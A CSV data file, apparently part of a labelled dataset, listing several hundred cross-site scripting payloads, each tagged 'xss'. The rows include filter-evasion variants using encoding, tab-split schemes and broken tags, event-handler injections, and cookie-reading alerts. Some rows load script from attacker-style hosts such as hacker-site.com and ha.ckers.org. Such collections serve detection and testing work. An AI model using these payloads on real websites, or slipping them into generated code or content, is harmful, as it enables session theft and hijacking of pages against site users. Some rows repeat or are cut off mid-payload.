,payload,type
7621,<svg/onload=alert(1),xss
7622,<input value=<><iframe/src=javascript:confirm(1),xss
7623,"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",xss
7624,<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
7625,<img src=`xx:xx`onerror=alert(1)>,xss
7626,"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
7627,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
7628,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
7629,"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
7630,<svg contentScriptType=text/vbs><script>MsgBox+1,xss
7631,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",xss
7632,<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
7633,<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
7634,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
7635,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
7636,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
7637,<script>+-+-1-+-+alert(1)</script>,xss
7638,<body/onload=&lt;!--&gt;&#10alert(1)>,xss
7639,<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
7640,<img src ?itworksonchrome?\/onerror = alert(1),xss
7641,<svg><script>//&NewLine;confirm(1);</script </svg>,xss
7642,<svg><script onlypossibleinopera:-)> alert(1),xss
7643,<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
7644,<script x> alert(1) </script 1=2,xss
7645,"<div/onmouseover='alert(1)'> style=""x:"">",xss
7646,<--`<img/src=` onerror=alert(1)> --!>,xss
7647,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
7648,"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
7649,"""><img src=x onerror=window.open('https://www.google.com/');>",xss
7650,<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
7651,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
7652,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
7653,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
7654,"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
7655,,xss
7656,"'';!--""<XSS>=&{()}",xss
7657,"'>//\\,<'>"">"">""*""",xss
7658,'); alert('XSS,xss
7659,<script>alert(1);</script>,xss
7660,<script>alert('XSS');</script>,xss
7661,"<IMG SRC=""javascript:alert('XSS');"">",xss
7662,<IMG SRC=javascript:alert('XSS')>,xss
7663,<IMG SRC=javascript:alert('XSS')>,xss
7664,<IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
7665,"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
7666,<scr<script>ipt>alert('XSS');</scr</script>ipt>,xss
7667,"<script>alert(String.fromCharCode(88,83,83))</script>",xss
7668,<img src=foo.png onerror=alert(/xssed/) />,xss
7669,"<style>@im\port'\ja\vasc\ript:alert(\""XSS\"")';</style>",xss
7670,"<? echo('<scr)'; echo('ipt>alert(\""XSS\"")</script>'); ?>",xss
7671,<marquee><script>alert('XSS')</script></marquee>,xss
7672,"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",xss
7673,"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",xss
7674,"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",xss
7675,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
7676,"""><script>alert(0)</script>",xss
7677,<script src=http://yoursite.com/your_files.js></script>,xss
7678,</title><script>alert(/xss/)</script>,xss
7679,</textarea><script>alert(/xss/)</script>,xss
7680,"<IMG LOWSRC=\""javascript:alert('XSS')\"">",xss
7681,"<IMG DYNSRC=\""javascript:alert('XSS')\"">",xss
7682,<font style='color:expression(alert(document.cookie))'>,xss
7683,"<img src=""javascript:alert('XSS')"">",xss
7684,"<script language=""JavaScript"">alert('XSS')</script>",xss
7685,"<body onunload=""javascript:alert('XSS');"">",xss
7686,"<body onLoad=""alert('XSS');""",xss
7687,"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",xss
7688,"""/></a></><img src=1.gif onerror=alert(1)>",xss
7689,"window.alert(""Bonjour !"");",xss
7690,"<div style=""x:expression((window.r==1)?'':eval('r=1;",xss
7691,"alert(String.fromCharCode(88,83,83));'))"">",xss
7692,<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,xss
7693,"""><script alert(String.fromCharCode(88,83,83))</script>",xss
7694,'>><marquee><h1>XSS</h1></marquee>,xss
7695,"'"">><script>alert('XSS')</script>",xss
7696,"'"">><marquee><h1>XSS</h1></marquee>",xss
7697,"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",xss
7698,"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",xss
7699,<script>var var = 1; alert(var)</script>,xss
7700,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
7701,"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",xss
7702,"<IMG SRC='vbscript:msgbox(\""XSS\"")'>",xss
7703,""" onfocus=alert(document.domain) ""> <""",xss
7704,"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",xss
7705,"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",xss
7706,"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",xss
7707,"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",xss
7708,"<br size=\""&{alert('XSS')}\"">",xss
7709,<scrscriptipt>alert(1)</scrscriptipt>,xss
7710,</br style=a:expression(alert())>,xss
7711,</script><script>alert(1)</script>,xss
7712,"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
7713,[color=red width=expression(alert(123))][color],xss
7714,"<BASE HREF=""javascript:alert('XSS');//"">",xss
7715,Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
7716,"""></iframe><script>alert(123)</script>",xss
7717,"<body onLoad=""while(true) alert('XSS');"">",xss
7718,"'""></title><script>alert(1111)</script>",xss
7719,"</textarea>'""><script>alert(document.cookie)</script>",xss
7720,"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",xss
7721,</script></script><<<<script><>>>><<<script>alert(123)</script>,xss
7722,<html><noalert><noscript>(123)</noscript><script>(123)</script>,xss
7723,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
7724,'></select><script>alert(123)</script>,xss
7725,"'>""><script src = 'http://www.site.com/XSS.js'></script>",xss
7726,}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,xss
7727,"<SCRIPT>document.write(""XSS"");</SCRIPT>",xss
7728,"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",xss
7729,"='><script>alert(""xss"")</script>",xss
7730,"<script+src="">""+src=""http://yoursite.com/xss.js?69,69""></script>",xss
7731,"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",xss
7732,""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",xss
7733,""">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",xss
7734,"src=""http://www.site.com/XSS.js""></script>",xss
7735,"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",xss
7736,"!--"" /><script>alert('xss');</script>",xss
7737,"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
7738,"""><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
7739,"'""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
7740,"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",xss
7741,<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,xss
7742,"""><script>alert(1337)</script>""><script>alert(""XSS by \nxss</h1></marquee>",xss
7743,"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",xss
7744,"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",xss
7745,"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",xss
7746,"""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",xss
7747,"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",xss
7748,http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,xss
7749,http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,xss
7750,'); alert('xss'); var x=',xss
7751,\\'); alert(\'xss\');var x=\',xss
7752,"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",xss
7753,">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",xss
7754,"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",xss
7755,</body>,xss
7756,</html>,xss
7757,<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,xss
7758,<SCRIPT> alert(“XSS”); </SCRIPT>,xss
7759,"<BODY ONLOAD=alert(""XSS"")>",xss
7760,"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
7761,"<IMG SRC=""javascript:alert('XSS');"">",xss
7762,"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
7763,"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
7764,<IFRAME SRC=”http://hacker-site.com/xss.html”>,xss
7765,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
7766,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
7767,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
7768,"<TD BACKGROUND=""javascript:alert('XSS')"">",xss
7769,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
7770,"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
7771,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",xss
7772,"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",xss
7773,"&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
7774,&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},xss
7775,&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,xss
7776,&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,xss
7777,"&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
7778,&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,xss
7779,&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
7780,&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
7781,&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,xss
7782,&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,xss
7783,&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,xss
7784,&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,xss
7785,%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,xss
7786,"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
7787,"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",xss
7788,"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",xss
7789,"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",xss
7790,"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss
7791,"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",xss
7792,"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
7793,"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",xss
7794,"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",xss
7795,"<IMG SRC=x onoffline=""alert(String.fromCharCode(88,83,83))"">",xss
7796,"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",xss
7797,"<IMG SRC=x onpageshow=""alert(String.fromCharCode(88,83,83))"">",xss
7798,"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",xss
7799,"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",xss
7800,"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",xss
7801,"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",xss
7802,"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",xss
7803,"<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",xss
7804,"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",xss
7805,"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",xss
7806,"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",xss
7807,"<IMG SRC=x onreset=""alert(String.fromCharCode(88,83,83))"">",xss
7808,"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",xss
7809,"<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",xss
7810,"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",xss
7811,"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",xss
7812,"<IMG SRC=x onkeypress=""alert(String.fromCharCode(88,83,83))"">",xss
7813,"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",xss
7814,"<IMG SRC=x onclick=""alert(String.fromCharCode(88,83,83))"">",xss
7815,"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",xss
7816,"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",xss
7817,"<IMG SRC=x onmousemove=""alert(String.fromCharCode(88,83,83))"">",xss
7818,"<IMG SRC=x onmouseout=""alert(String.fromCharCode(88,83,83))"">",xss
7819,"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",xss
7820,"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",xss
7821,"<IMG SRC=x onmousewheel=""alert(String.fromCharCode(88,83,83))"">",xss
7822,"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",xss
7823,"<IMG SRC=x ondrag=""alert(String.fromCharCode(88,83,83))"">",xss
7824,"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",xss
7825,"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",xss
7826,"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",xss
7827,"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",xss
7828,"<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",xss
7829,"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",xss
7830,"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",xss
7831,"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",xss
7832,"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",xss
7833,"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",xss
7834,"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",xss
7835,"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",xss
7836,"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",xss
7837,"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",xss
7838,"<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",xss
7839,"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",xss
7840,"<IMG SRC=x onended=""alert(String.fromCharCode(88,83,83))"">",xss
7841,"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",xss
7842,"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",xss
7843,"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",xss
7844,"<IMG SRC=x onloadstart=""alert(String.fromCharCode(88,83,83))"">",xss
7845,"<IMG SRC=x onpause=""alert(String.fromCharCode(88,83,83))"">",xss
7846,"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",xss
7847,"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",xss
7848,"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",xss
7849,"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",xss
7850,"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",xss
7851,"<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",xss
7852,"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",xss
7853,"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",xss
7854,"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode(88,83,83))"">",xss
7855,"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",xss
7856,"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",xss
7857,"<IMG SRC=x onshow=""alert(String.fromCharCode(88,83,83))"">",xss
7858,"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",xss
7859,"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",xss
7860,"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
7861,"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",xss
7862,"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",xss
7863,"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss
7864,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
7865,"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
7866,"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss
7867,"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",xss
7868,"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss
7869,"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",xss
7870,"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",xss
7871,"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",xss
7872,"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",xss
7873,"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",xss
7874,"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",xss
7875,<iframe src=http://xss.rocks/scriptlet.html <,xss
7876,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
